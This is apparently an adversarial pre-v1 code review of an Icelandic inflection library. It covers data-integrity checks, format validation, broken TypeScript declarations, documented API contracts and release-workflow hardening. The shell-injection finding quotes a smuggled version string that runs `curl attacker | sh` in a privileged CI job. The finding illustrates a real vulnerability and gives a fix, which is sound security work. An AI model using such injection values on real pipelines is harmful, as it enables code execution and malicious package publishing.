# Beygir — Adversarial Codebase Review

**Date:** 2026-07-07
**Scope:** Full repository — binary-format read path, builder/write path, public API
layer, grammar/CSV ingestion, and infrastructure/release engineering.
**Method:** Every source file in scope was read in full (≈12.6k lines of source,
≈5k of tests) across five independent deep reviews. Headline findings were
verified against the running code: `dreifing/` was built, the test suite run
(201 pass, 4 self-skip), typecheck clean, lint clean. The riskiest findings were
reproduced with crafted inputs against real builder output.

---

## Overall verdict

This is a genuinely well-engineered codebase — above the median for a pre-1.0
library — and it is **not yet ready to freeze as v1**.

The binary-format core is the strongest part. Container parsing is
hostile-input-safe: every attacker-controlled count is bounded before
allocation, varints are strict, and no OOB reads, unbounded allocations, or
infinite loops were found even under crafted-input probing. The builder is
deterministic by construction and read-back-verifies before publishing, and the
writer↔reader byte contracts check out everywhere they were traced — including
the subtle Icelandic-character ordering and case-mask round-trips. The public
method API (naming, the `[]`/`null`/throw contract, `sía`/`velja` options, cursor
validation, `using` lifecycle) is coherent and better-documented than most v1s.

The weaknesses cluster in three places, and they are what stand between this and
a v1:

1. **The opening / integrity layer** silently trusts data it claims to verify.
2. **The release & packaging pipeline tests the repo, never the product** — and
   the shipped types are broken for strict TypeScript consumers today.
3. **A few documented contracts do not match the implementation**, which is the
   one thing that cannot ship in a frozen API.

None of this is a rewrite. Every item below is a contained fix. The estimated
gap to a defensible v1 is roughly two to three focused days, none of it
architectural.

Severity legend: **CRITICAL** (security / data-corruption / ships-broken),
**MAJOR** (wrong results or broken contract in a real scenario), **MINOR**
(hardening, robustness, dead code, docs).

---

## Must fix before v1

### Integrity is advisory when it is supposed to be enforced

- **[MAJOR] SHA-256 failure on the packaged data is downgraded to a
  `console.warn`, and the mismatching data loads anyway.**
  `kóði/beygir/pökkuð-gagnaskrá.ts:181-188` (sync) and `:211-218` (async). When
  the packaged `.bin.br` decompresses but fails the `.sha256` check,
  `afþjappaGagnaskráSamstilltEfÞarf` throws — but `finnaGagnaskrárslóð` catches
  it, emits the misleading "gat ekki varðveitt" (could-not-persist) warning, and
  returns the `.br` path, which `kóði/snið/geymsla/innlestur.ts:43-49` then
  decompresses with **no SHA check at all**. Reproduced: `opnaBeygi()` with an
  all-zeros `.sha256` sidecar succeeded and served data. Combined with
  `staðfesta` defaulting to `false`, integrity is effectively advisory on the
  exact path (read-only deployments) the SHA sidecar was designed for. The
  strict-reject behavior in `pökkuð-gagnaskrá.test.ts:93-101` only holds for the
  direct `afþjappa*` calls, not the `opnaBeygi()` flow users actually hit.
  **Fix:** make the mismatch fatal, or at minimum an accurate, loud error — never
  silent use of mismatching bytes.

- **[MAJOR] The `.afleitt` derived-index sidecar is trusted unbound by default.**
  `kóði/beygir/gagnaskrá.ts:238-239` passes a `null` key unless
  `staðfesta: true`, and `kóði/snið/afleitt.ts:184-206` then skips the stored-key
  comparison; only array *lengths* are checked (`afleitt.ts:109-117`). The
  project's own test (`gagnaskrá.test.ts:304-330`) confirms a bit-flipped sidecar
  loads with `afleittVirkt: true`. A stale or foreign sidecar whose tables happen
  to keep the same lengths produces silently wrong lookup results. `staðfesta` is
  also overloaded: one flag controls both structural data-file verification and
  sidecar key binding. **Fix:** bind the sidecar by stored key; split `staðfesta`
  into distinct data-verification and sidecar-binding options.

- **[MAJOR] Even documented strict mode (`staðfesta: true`) misses two invariants
  the hot paths depend on.** Both reproduced on real builder output.
  - *DAFSA edge-label ordering is never validated.* `kóði/snið/dafsa.ts:211-248`
    (`finnaLegg`) requires strictly-increasing `merkingar` per node (documented
    at `dafsa.ts:21`), but the constructor, `staðfestaTalningu`, and
    `staðfestaViðbót` never check it. Verified: swapping two adjacent label bytes
    yields a file that opens clean under full validation, reports the right key
    count, yet returns −1 for a stored key; with >8 legs the binary-search branch
    can misroute to a wrong leg. Silent false negatives / nondeterminism under
    the exact option users are told to use for untrusted files.
  - *STOF lemma-row deltas are never validated.* `kóði/snið/lestur.ts:1008-1036`
    (`staðfestaTengsl`) touches SNID/STOF/TAUK/IDBS cross-links but never
    `uppflettiraðarmismunir`; `afleiðsla.ts:36-46` decodes with `>>> 0`
    wraparound and no range check. Verified: corrupting one varint in STOF's
    second variable region opened cleanly under `staðfesta: true` and made
    `sækja(1)` return `{ orð: "", auðkenni: 1, ... }`. The non-null assertion at
    `flettusýn.ts:321` is the unsound cast that turns a detectable format error
    into silent garbage.

### The published package is broken for strict TypeScript consumers — today

- **[CRITICAL] Emitted `.d.ts` files use extensionless relative imports.**
  `tsconfig.dreifing.json:3-10` emits declarations from source whose relative
  imports are extensionless (the project's own lint,
  `skriftur/athuga-innflutning.ts:178-183`, *forbids* `.ts` extensions).
  Confirmed in build output: `dreifing/kóði/beygir/gagnaskrá.d.ts:38,75,76`
  contain `from "../snið/viðmót"`. A consumer with
  `"moduleResolution": "nodenext"` and `skipLibCheck: false` gets hard
  `error TS2834` (reproduced: 3 errors from a clean consumer project).
  `skipLibCheck: true` masks it, which is why nobody has noticed. **Fix:**
  `rewriteRelativeImportExtensions` + `.ts`-suffixed imports (TS 6 supports this;
  the import-lint rule must be inverted), or bundle declarations. Add an
  `arethetypeswrong` (attw) check to CI.

- **[MAJOR] The published artifact is never installation-tested.**
  `.github/workflows/athuganir.yml:161` stops at `npm pack --dry-run`; nothing
  ever does `npm pack` → install the tarball into a clean project → run
  `próf/node-reykpróf.mjs` against the *installed* package. The smoke tests
  (`athuganir.yml:109,160`) run inside the repo via Node self-reference, where
  the `files` filter (`package.json:27-39`) is not in effect. Demonstration:
  `prepack` + `npm pack` happily packed a 6-byte garbage `.gögn/beygir.bin.br`.
  A `files`-list regression (e.g. dropping `kóði/kristínarsnið/`, which the `bun`
  condition needs) would ship silently.

### Documented contracts that do not match the code

- **[MAJOR] `greina` documentation contradicts the implementation.**
  `kóði/snið/viðmót.ts:752-753` promises the analysis is only returned for words
  that do not themselves exist as a registered lemma or inflected form, but
  `kóði/snið/lestur.ts:2408-2432` never checks existence — it goes straight to
  compound-splitting (confirmed). For a word registered as its own lemma
  (`hefur(orð) === true`), `greina` still returns a `tilgáta: true` analysis with
  `auðkenni: null`, shadowing the real BÍN entry for anyone using the documented
  "null means it's a real word" contract. **Fix:** add the `hefur` guard or
  change the docs — but make it exact before freezing.

### Release-pipeline hardening (privileged workflow)

- **[CRITICAL] Shell injection in the release workflow.**
  `.github/workflows/gefa-ut.yml:64,119,126,130,134,138,145-148,155-156`
  interpolate `${{ inputs.version }}` / `${{ inputs.npm_merki }}` directly into
  `run:` blocks. The semver validation in `skriftur/gefa-út.ts:37` happens
  *after* the shell has already expanded the input, so a version like
  `0.0.1"; curl attacker | sh; echo "` executes arbitrary code in a job holding
  `contents: write` **and** `id-token: write` (npm trusted-publishing
  credentials). Only write-access users can dispatch, but this converts "can
  trigger a workflow" into "can publish an unreviewed malicious package and push
  to stofn", bypassing review. **Fix:** pass inputs via `env:` and reference
  `"$VERSION"`.

- **[MAJOR] No SHA-pinned actions in a publishing pipeline.** All three workflows
  pin by tag only (`actions/checkout@v5`, third-party `oven-sh/setup-bun@v2`,
  `actions/cache@v5`, `actions/setup-node@v6`, `actions/upload-artifact@v7`). A
  compromised tag on `oven-sh/setup-bun` executes inside the job holding the npm
  OIDC token. Pin to commit SHAs (at least in `gefa-ut.yml`), add an
  `environment:` with required reviewers on the publish job, and
  `persist-credentials: false` on checkouts that don't push.

- **[MAJOR] The "verify full data file" release gate is vacuous exactly when it
  matters.** `próf/samþætting/gagnaskrá-sha.test.ts:52-58`: if the source CSV's
  hash isn't in the two-entry `ÞEKKTAR_GAGNASKRÁR` map (lines 15-30), the test
  logs a warning and **passes**. The release workflow (`gefa-ut.yml:66-67`)
  fetches the *newest* BÍN dump with `--endursækja` — unknown until someone
  hand-updates the map. On every new BÍN release the "Staðfesta fulla gagnaskrá"
  step verifies nothing beyond what the builder self-checks. **Fix:** fail closed
  (or require an explicit ack input) on an unknown dump.

- **[MINOR] Publish ordering.** `gefa-ut.yml:124-134` commits and pushes the
  version bump *before* `npm publish`. If publish fails (OIDC misconfig, registry
  outage), `stofn` permanently claims a version npm never got. Publish first, or
  push last.

---

## Should fix / decide deliberately

- **[MAJOR] Default-import side effects.** `kóði/beygir/beygir.ts:75` runs
  `opnaBeygi()` at module scope: synchronous read + brotli decompress (3.2 → 13.3
  MiB) and, via `pökkuð-gagnaskrá.ts:140-144`, a 13.3 MiB **write into the
  installed package directory inside `node_modules`** on first import. This
  breaks pnpm's content-addressed store, Nix, and immutable Docker layers, and
  adds decompress-per-boot latency in read-only environments; a missing data file
  throws during ESM evaluation, which is hard to catch. It is documented, but for
  a v1 the default entry doing sync I/O + disk writes at import time is a footgun.
  Prefer lazy-open on first method call, keeping the same exported object.

- **[MAJOR] Package-root detection is a substring heuristic.**
  `kóði/beygir/pökkuð-gagnaskrá.ts:11-15` uses
  `ÞESSI_SKRÁ.includes(`${sep}dreifing${sep}`)`. Placing the source tree under
  any directory named `dreifing` (plausible — it is the package's own word for
  "distribution") makes the Bun/source resolution compute `PAKKARÓT` one level
  too high, and import fails with "Gagnaskrá fannst ekki". Same pattern in
  `skriftur/smíða-dreifingu.ts:20-23`. Separately, `fileURLToPath(import.meta.url)`
  resolution means esbuild/webpack-bundled Node apps resolve `.gögn/beygir.bin`
  relative to the bundle, and the README never mentions that
  `GAGNASKRA_SLOD`/`slóð` is required when bundling.

- **[MAJOR] `raðaDafsa` (public API) silently produces a corrupt DAFSA on
  unsorted input.** `kóði/snið/dafsa-röðun.ts:9` / `dafsa-smíði.ts:47`, published
  via `kóði/beygir/dafsa-smiður.ts:6` (`@yrda/beygir/dafsa/smiður`). The
  Daciuk-style incremental minimization assumes strictly byte-sorted keys but
  never checks. Verified: `raðaDafsa(["ab","b","ac"])` builds a chunk that passes
  `DafsaLesari.undirbúa()` validation, reports `lyklafjöldi = 3`, yet `röð("ac")`
  returns **−1** — the key is unfindable, silently. It also skips the
  `HÁMARK_LYKILBÆTA = 128` cap. **Fix:** run the strict byte-order + length check
  it already has available internally.

- **[MAJOR] Impersonal-verb (`OP-…`) subject-case atoms collide with form-case
  atoms in the bitmask.** `kóði/málfræði/mark/maski.ts:57-75`: the mask is an
  unordered atom set, so in `OP-ÞF-GM-FH-NT-3P-ET` the subject-case `ÞF` occupies
  the same bits as a form-case `ÞF`. Consequences: a filter `án: ["ÞF"]`
  (`lestur.ts:1569-1577`) wrongly excludes every accusative-subject impersonal
  form; `með: ["ÞF","ET"]` matches them; and the case-swap feature
  (`inniheldurFall`/`skiptaUmFallÍMarkamaska`, `lestur.ts:2368-2384`) treats an OP
  subject case as a swappable inflection case. (The 41-atom bit layout itself is
  collision-free — verified.)

- **[MAJOR] CRLF blind spot in CSV ingestion.**
  `kóði/kristínarsnið/innlestur.ts:14` + `þáttun.ts:21` split on `"\n"` only and
  never strip `"\r"`; on CRLF input every row's 15th field (`aukafletta`)
  silently becomes `"…\r"`, and validation cannot catch it because `aukafletta`
  is validated as an arbitrary string (`fullgilding.ts:266`). Latent today
  (current file is LF); if Árnastofnun re-exports with CRLF the build succeeds
  but every `aukafletta` key is corrupted. (BOM, by contrast, is handled.)

- **[MAJOR] No cross-platform / cross-version CI.** Everything runs on
  `ubuntu-latest`. The package ships non-ASCII paths (`kóði/`, `dreifing/kóði/`,
  `.gögn/`) and Windows-aware path logic (`pökkuð-gagnaskrá.ts:12`) that has never
  executed on Windows in CI. The `samþætting` smoke test (`athuganir.yml:109`)
  uses whatever Node the runner ships (unpinned, drifting). No `engines` field —
  with ESM-only output and no `require` condition, CJS consumers on Node < 22.12
  fail with `ERR_REQUIRE_ESM` and no install-time warning. **Fix:** add a
  Linux/Windows/macOS × Node 20/22/24 matrix and an `engines` field.

- **[MINOR] Option validation is inconsistent across entrypoints.** `opnaBeygi`
  strictly rejects unknown keys and wrong types (`gagnaskrá.ts:110-131`), but
  `opnaBeygiÚrBiðminni`/`sækjaBeygi` (`vefur.ts:88-110`) validate nothing, and
  `staðfesta` defaults `false` in `gagnaskrá` but `true` in `vefur`. Generator
  methods `leitarsíður`/`leitarniðurstöður` (`lestur.ts:2956-2987`) defer all
  argument validation to first `next()`, unlike `leita` which throws at the call
  (and the error text names the wrong method). Unify before freeze.

- **[MINOR] Durability gaps in atomic writes.** `gagnaskrá-skrif.ts:122-138` and
  `atómísk-skrif.ts` correctly do temp-file + fsync + rename, but never fsync the
  parent directory after rename, so the rename is not crash-durable; power loss
  can pair a fresh `.sha256` with an old `.bin`. `brotli.ts:32-40`
  (`þjappaBrotliSkrá`) has no fsync at all — a crash can durably publish a
  truncated `.br`.

- **[MINOR] Two unchecked capacity limits with no loud failure.** The reader
  packs `(stofnsæti << 12) | sniðliður` into u32 (`afleiðsla.ts:175`), a ceiling
  of 2²⁰ = 1,048,576 stems; the builder validates every other bit-width but never
  `fjöldiStofna < 2²⁰` (current data ≈356k, ~3× headroom). And the AUKA "no
  aukafletta" convention (`textaaukar.ts:84`) assumes `aukaflettur[0] === ""` but
  never asserts it. Add loud asserts.

- **[MINOR] `engines`, `browser` condition, and packaging metadata.**
  `package.json:40-44` root export has no `browser` condition, so browser
  bundlers resolve `default` → the Node bundle with `node:fs`/`node:crypto`. No
  `"./package.json"` export, no `main`/`types` fallback for node10-resolution
  tooling, no `sideEffects` hints (the root entry genuinely has side effects;
  `vefur`/`dafsa` don't).

---

## Candidates to cut / simplify before v1

A smaller public surface is easier to freeze correctly.

- **[MINOR] Speculative DAFSA "netganga" API** (`dafsa.ts:254-290,665-758`:
  `Göngustaða`, `Dafsaleggur`, `rótarstaða`, `fylgjaLegg`, `leggirFrá`,
  `hrágögn`, `grunngögn`) has zero non-test consumers; the comments admit it is
  for a future fuzzy-search feature. Do not ship public surface for an unbuilt
  consumer.
- **[MINOR] Leaked low-level helpers.** `skrifaVarint` from
  `@yrda/beygir/dafsa/smiður` (`dafsa-smiður.ts:7`) is a raw
  append-to-`number[]` helper with no public contract. `Lesari.hefurFærslu`
  (`lestur.ts:1952`) is public and tested but absent from the `Beygir` interface
  — expose intentionally or hide.
- **[MINOR] `Leitarbendill` is documented as opaque but is a fully structural,
  serializable type** exposing internal row indexes (`leit.ts:29-35`). A
  branded/string token keeps it honest across format versions instead of freezing
  internal layout into the public API.
- **[MINOR] Duplication (review hazards, not bugs).** Two copies of the
  0x80→U+02BC text fixup (`textakóðun.ts:224-258` ≡
  `textasýn-grunnur.ts:18-55`); two bitset-rank routines
  (`lestur.ts:1756-1772` ≡ `flettusýn.ts:216-234`); two atomic writers
  (`gagnaskrá-skrif.ts:122-138` ≡ `atómísk-skrif.ts:27-46`); and **two different
  files both named `samsetning.ts`** (compound splitter vs. bitmask builder) —
  rename one. `lestur.ts` at 3,133 lines has a self-contained ~600-line
  prefix-search paging module (`Leitarástand`/bendill/afgangur, ~2466-2978) that
  could be extracted.

---

## What to add before v1

- **A pack→install→smoke CI job** across the platform/Node matrix — the single
  highest-value gap. It catches the broken `.d.ts`, `files`-list regressions, and
  the Windows path story at once.
- **A byte-flip fuzz/property test** ("throws or answers, never hangs/crashes")
  over each chunk — the cheapest defense for the container layer; it would have
  caught both strict-mode validation gaps.
- **`prepack` integrity checks** (size floor, hash cross-check, brotli header
  sniff). Today `undirbúa-pökkun.ts:22-29` only checks the files `existsSync`.
- **A BÍN edition/date identifier in `Gagnauppruni`** — consumers will want it
  for cache keys; today it exposes only line count / bytes / sha256.
- **An integrity story for `sækjaBeygi`** — the browser/CDN fetch path has none
  (no expected-hash option).
- **Test coverage for the format's sharp edges**: the >8-leg DAFSA binary-search
  branch, capacity limits beyond the 10-bit mark, CRLF/BOM/embedded-semicolon CSV
  rows, `Number()`-coercion garbage (`"1e3"`, `""`→0), the
  `þáttaMark`/`staðfestaMark` divergence on `"gr"`/`""`, and
  `skriftur/sækja-kristínarsnið.ts` (no tests at all).

---

## Additional minor findings (inventory)

Read-path robustness (safe today, hostile to diagnosis or memory-release on
crafted/edge input):

- `lestur.ts:3120-3131` (`losa`) doesn't clear `leitargangaUppflettiorða`/
  `leitargangaBeygingarmynda`; the cached gangas retain multi-MB arrays, so
  `losa()` doesn't actually release them.
- `lestur.ts:736,1607-1629` — the per-stem `stofngrunnar` memo is populated by
  the full-scan `lesaUppflettiorð()` and permanently caches ~330k objects until
  `losa()`; the docs imply transient cost.
- `afleiðsla.ts:99-103` — a TILB anchor at a stofn with `fjöldiSniðliða == 0`
  writes into the next stofn's slot (the lemma loop guards this; the anchor loop
  doesn't).
- `lestur.ts:1259-1268` (`beitaHástafamaska`) blindly applies `kóði - 0x20`; a
  corrupt STAF mask silently produces mojibake.
- `flettusýn.ts:143,185` — corrupt LBIT surfaces as a bare
  `RangeError: invalid typed array length` instead of a format error.
- `varint.ts:37` consumes a 6th byte at shift 28 before throwing; non-canonical
  encodings (`0x80 0x00` → 0) are accepted, so byte-level determinism is not
  enforced by the reader.

Grammar / CSV:

- `mark/þáttun.ts:145-152` vs `:166-168` — `þáttaMark` and `staðfestaMark`
  disagree on `"gr"`, `"2"/"3"/"4"`, and `""` (parser accepts, validator
  rejects).
- `mark/fallbeygingarhlutar.ts:22-43` over-generates all 64 case-part
  combinations that never occur in BÍN; `MARKHLUTAR_MEÐ_AFBRIGÐI` hard-codes
  variants, so a new BÍN variant makes the whole build throw (fail-loud).
- `kristínarsnið/þáttun.ts:7-14` — `þáttaMillivísun("abc")` returns `NaN`, not
  `null`, and flows out silently on the non-startup (`staðfesta=false`) path.
- `kristínarsnið/þáttun.ts:30-40` — numeric fields coerced with `Number()` before
  validation, so `"1e3"`, `"0x10"`, `" 7"`, `""`→0 are accepted.
- `kristínarsnið/innlestur.ts:5` — `TextDecoderStream` is non-fatal; invalid
  UTF-8 becomes U+FFFD and passes.
- `kristínarsnið/fullgilding.ts:136-146,209,246,166-177` — `millivísun` has no
  upper bound while `auðkenni` is u32-capped; `orð`/`beygingarmynd` accept the
  empty string; `hluti` items are trimmed for checking but stored untrimmed
  (dedup divergence).
- `málfræði/hreinsun.ts:7-49` collapses interior empty items in `málfræði`, so
  originally distinct values become indistinguishable downstream.
- `skriftur/sækja-kristínarsnið.ts` — checksum is self-referential (ships inside
  the verified zip: guards corruption, not authenticity); `fetch` follows
  redirects (silent HTTP downgrade); hand-rolled ZIP reader has no ZIP64 support;
  2-minute timeout is total, not inactivity, and retries restart from byte 0.

Builder:

- `stafmynstur.ts:92` uses `<` (allows equal) for STAF monotonicity; the reader
  keys exceptions in a Map, so a duplicate `sæti` silently overwrites — should be
  `<=`.
- `auðkennisbitar.ts:28-29` + `innlestur.ts:71` — a single corrupt CSV ID near
  u32 produces a ~512 MB IDBS allocation instead of an error.
- `skriftur/smíða-skráarsnið.ts:6` uses `process.cwd()` as repo root (vs.
  `import.meta.dir` elsewhere); invoked from a subdirectory it writes generated
  files into the wrong tree.

Infra / release:

- `pökkuð-gagnaskrá.ts:11-15` root-substring bug (also in
  `smíða-dreifingu.ts:20-23`).
- Integration tests self-skip silently (`existsSync ? test : test.skip`); the
  push job on `stofn` runs with no data, so integration tests never run on the
  release branch outside release day. Add a "data required, fail if skipped" CI
  flag.
- `smíða-dreifingu.ts:49,65` `splitting: false` — `beygir.js` and `gagnaskrá.js`
  each embed a full ~190 kB copy of the reader; in Node they get disjoint module
  state and class identities, in Bun (source) they're shared — latent behavioral
  divergence between the two supported runtimes.
- `knip.json:2-9` entry list omits the actual package entrypoints; public-API
  liveness rides on tests importing everything.
- `typedoc/typedoc.json` documents only 3 of the 6 exported subpaths.
- `gefa-ut-sqlite.yml:108` `--clobber` can silently replace released artifacts on
  an existing tag; checksums change under consumers who pinned the URL.
- `.oxlintrc.json:17` disables `typescript/no-non-null-assertion` — the only
  meaningful strictness hole (everything else is genuinely strict).

---

## Things attacked and not broken (positive verification)

Stated because they were specifically targeted:

- **Reader memory safety:** no OOB access, no unbounded allocation, no infinite
  loop; cycle/degenerate DAFSA traversals all terminate.
- **Varint at 2³¹/2³²−1 boundaries:** correct (results re-normalized with
  `>>> 0`).
- **Icelandic case/ordering:** correct end-to-end. The Latin-1+ tables exclude
  `×`/`÷`/`ß`/`ÿ`; the U+02BC↔0x80 special-byte round trip is consistent across
  encode/decode/lowercase; the byte comparator matches on both build and read
  sides — no UTF-8/code-point order mismatch.
- **Container robustness:** header-vs-count consistency, overlap sort check,
  4-byte alignment with copy fallback for misaligned views — all correct.
- **Build determinism:** byte-identical rebuild is tested; all sorts have
  deterministic comparators or explicit tie-breaks; Maps iterate in deterministic
  insertion order. No hash-collision or iteration-order hazards.
- **Cursor forgery:** `Leitarbendill` revalidation is thorough — forged streams,
  mismatched rows, and out-of-range rows all throw before any unsafe indexing.
- **Zod → handwritten validation port:** faithful field-for-field (diffed against
  the pre-#17 schema). No missing checks, no wrong optionality, no
  string-vs-number regressions.
- **Download script:** atomic temp-file + rename with cleanup on every failure
  path, size + SHA verification of the streamed CSV, bounded retries, correct
  raw-deflate handling.
- **Release model:** OIDC trusted publishing with `--provenance` and no
  long-lived npm token is the right choice; `gefa-út.ts` preflight (semver / tag
  / branch / npm-collision, correct `E404` handling) is solid.
- **Licensing:** dual licensing (Apache-2.0 AND CC-BY-SA-4.0) is unusually well
  documented in `GÖGN-OG-LEYFI.md` / `NOTICE`.
- **Examples:** typechecked by the repo-wide `tsc` gate, so they match the
  current API.

---

## Direction

The strategic bet — a custom compact binary format with a hand-tuned reader
instead of SQLite or a naive JSON/trie — is justified by the results (13.3 MiB /
3.2 MiB compressed, sub-microsecond lookups, browser-capable) and the engineering
discipline backs it up. The direction is sound. The gap to v1 is not capability;
it is making the safety and packaging match the quality of the core: enforce the
integrity you advertise, test the product you ship rather than the repo you build
it in, and make the frozen contracts (types, `greina`, `Leitarbendill`, option
validation) exact.

### Suggested v1 sequencing

1. Make the packaged-data SHA mismatch fatal; bind the `.afleitt` sidecar by
   stored key; split `staðfesta`.
2. Fix declaration emit for `nodenext` and add an attw check to CI.
3. Make `greina` match its documented contract (or change the docs).
4. De-fang the release workflow (env-var inputs, SHA-pinned actions, environment
   protection, publish-before-push); make the known-hash data gate fail closed.
5. Add a pack→install→smoke job (Linux + Windows + macOS, Node 20/22/24) and an
   `engines` field.
6. Add strict-mode validation for DAFSA label ordering and STOF deltas; add the
   two capacity asserts; add a byte-flip fuzz test.
7. Fix `raðaDafsa` precondition enforcement; fix the OP subject-case mask
   conflation.
8. Trim the public surface: hide/rename the netganga API, `skrifaVarint`,
   `hefurFærslu`; decide on `Leitarbendill` opacity.
